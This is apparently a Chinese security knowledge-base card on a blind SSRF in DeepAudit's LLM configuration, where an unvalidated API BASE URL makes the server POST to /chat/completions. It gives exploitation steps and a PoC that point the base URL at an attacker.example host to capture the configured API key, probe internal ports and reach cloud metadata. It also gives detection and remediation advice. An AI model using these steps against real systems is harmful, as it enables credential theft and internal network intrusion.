---
id: web-generic-ssrf-deepaudit-llm-base-url-chat-completions
title: DeepAudit LLM 配置 API BASE URL 无校验：服务端向任意地址 POST /chat/completions（盲 SSRF）
type: scenario
domain: web
path: web/generic/ssrf
technique: deepaudit-llm-base-url-ssrf
tags:
- web
- ssrf
- ai
- llm
- blind-ssrf
- internal-network
- python
- fastapi
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V164
  verified_at: '2026-11-06T09:59:44+08:00'
  notes: 已对照原文 4.2 漏洞(2) 与图 07/08 核对：系统管理→LLM 配置含 API KEY/模型名称/API BASE URL（留空用官方或填中转站）、普通注册账号可进入、把 BASE URL 指向自控 0.0.0.0:8000 后日志收到 POST /chat/completions（501 Unsupported method），均一致；卡片按盲 SSRF 描述并说明未验证云元数据读取，边界正确。DeepAudit 3.0.4 为目标环境版本、原文未给受影响区间，不设 affected_versions。未验证点：未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/ssrf/web-generic-ssrf-deepaudit-llm-base-url-chat-completions/
draft: false
kb_aliases:
- DeepAudit SSRF
- LLM API BASE URL SSRF
- 模型配置 SSRF
- /chat/completions SSRF
- AI 审计系统 SSRF
---

## 一句话结论

DeepAudit 的“系统管理 → LLM 配置”允许用户填写任意 `API BASE URL`，后端在“测试连接”/审计任务时直接向 `{API BASE URL}/chat/completions` 发起 POST 请求，未校验协议、域名或内网地址；普通注册用户即可把 base URL 指向攻击者服务器或内网地址，形成可验证的盲 SSRF，并可能把配置中的 API Key 一并发送到攻击者服务器。

## 原理

- DeepAudit 支持 OpenAI 兼容接口与“中转站”：LLM 配置页包含 `API KEY`、`模型名称`、`API BASE URL` 三个字段，并提示“留空使用官方地址，或填入中转站地址”。
- 后端使用标准 OpenAI 客户端/HTTP 封装，把 base URL 与固定路径 `/chat/completions` 拼接后发起 POST，请求体包含 `model`、`messages` 等；认证头通常是 `Authorization: Bearer <配置的 API Key>`。
- 代码没有对 base URL 做 scheme/主机/IP 校验：`http://127.0.0.1:8000`、`http://169.254.169.254/...`、内部服务地址都会被接受；测试连接会把请求结果/错误显示在界面上，任务执行时也会触发。
- 文章用注册的普通账号进入“系统管理”，把 API BASE URL 指向自己的 `0.0.0.0:8000` 监听，后端日志显示收到 `POST /chat/completions`，证明外部可控的 outbound 请求成立。
- 因为请求带上了服务端保存的 API Key，攻击者控制 base URL 时还可能直接窃取该密钥；若内网存在接受 POST 的服务，可进一步做端口探测/请求伪造。
- 本质：把“用户可配置的第三方服务地址”直接交给服务端 HTTP 客户端，没有做目标地址白名单/私网拦截，“测试连接”功能成了 SSRF 入口。

## 触发条件

- 攻击者拥有 DeepAudit 账号（文章实例可自助注册），且该账号能访问“系统管理 → LLM 配置”（文章中的普通注册账号可进入）。
- 后端版本未对 `API BASE URL` 做协议/域名/IP 校验，也未禁止私网/链路本地地址。
- 服务端可出网，或至少能访问目标内网地址。
- 触发点包括“测试连接”按钮、创建 Agent 审计任务时的模型调用等。

## 利用步骤

1. 注册/登录 DeepAudit，进入“系统管理 → LLM 配置”。
2. 把 `API BASE URL` 设置为攻击者控制的地址（如 `http://attacker.com:8000/v1`）或待探测的内网地址（如 `http://127.0.0.1:8000/v1`）。
3. 填写任意 `API KEY` 与模型名，点击“测试连接”；在攻击者服务器/内网目标上观察是否收到 `POST /chat/completions`。
4. 若只看到连接错误，可利用不同错误（连接拒绝/超时/JSON 解析失败）判断内网端口开放情况。
5. 若目标是内网 OpenAI 兼容服务，可直接与其交互；若攻击者控制 base URL，检查请求头中的 `Authorization` 是否带出真实 API Key。
6. 进一步尝试 `http://169.254.169.254/latest/meta-data/` 等地址，注意该方法固定为 POST，云元数据通常要求 GET，可能需要借助重定向或其它路径。

## PoC

```text
# 配置页（文章图07）
选择 LLM 提供商: OpenAI GPT
API KEY: <任意>
模型名称: gpt-4o
API BASE URL: http://attacker.example:8000/v1
点击“测试”
```

```http
# 攻击者监听端收到（文章图08 的日志形态）
POST /chat/completions HTTP/1.1
Host: attacker.example:8000
Authorization: Bearer <配置的 API Key>
Content-Type: application/json

{"model":"gpt-4o","messages":[{"role":"user","content":"..."}]}
```

```text
# 若把 base URL 换成 http://127.0.0.1:<port>/v1，
# 可通过“连接拒绝/超时/非 JSON 响应”的差异探测内网端口。
```

## 变体与关联

- 同类“AI 模型配置/测试连接”SSRF：禅道 AI 模型 `base` 参数、Dify 模型配置、各类 OpenAI 兼容中转站配置页；只要 base URL 可控且服务端直接请求，就有相同风险。
- 若后端会跟随重定向，可尝试 302/307 跳到云元数据或内网 GET 接口；若只允许 HTTPS，可用自签名证书 + 关闭校验的目标。
- 关联：[[web-generic-ssrf-zentao-ai-model-test-connection]]（同类的 AI 模型 base URL SSRF）、[[web-generic-ssrf-ai-inference-model-param-url-ssrf]]（AI 推理参数 URL 注入）、[[ai-security-gateway-security-litellm-custom-guardrail-http-primitive-ssrf]]（AI 网关的 HTTP 原语 SSRF）。
- 边界：文章只验证了向攻击者监听端发起请求，未验证读取云元数据/内网服务的完整利用；若目标版本已加入 base URL 白名单、私网拦截，或普通用户无系统管理权限，则利用条件不成立。

## 检测与防御

- 检测：审计所有“可配置 base URL/回调 URL/模型地址”的功能，检查是否校验 scheme、域名、解析后的 IP；对指向私网、链路本地、云元数据地址的请求告警；监控 `/chat/completions` 请求异常外连。
- 修复：对 LLM base URL 使用域名/提供商白名单；解析后拒绝 RFC1918、loopback、link-local、metadata 地址；禁止跟随跨域重定向；把“测试连接”放到受控出网代理后。
- 加固：LLM 配置仅管理员可改，并做二次确认/审计；API Key 加密存储且不向用户可控 base URL 发送；普通用户与系统管理权限分离。
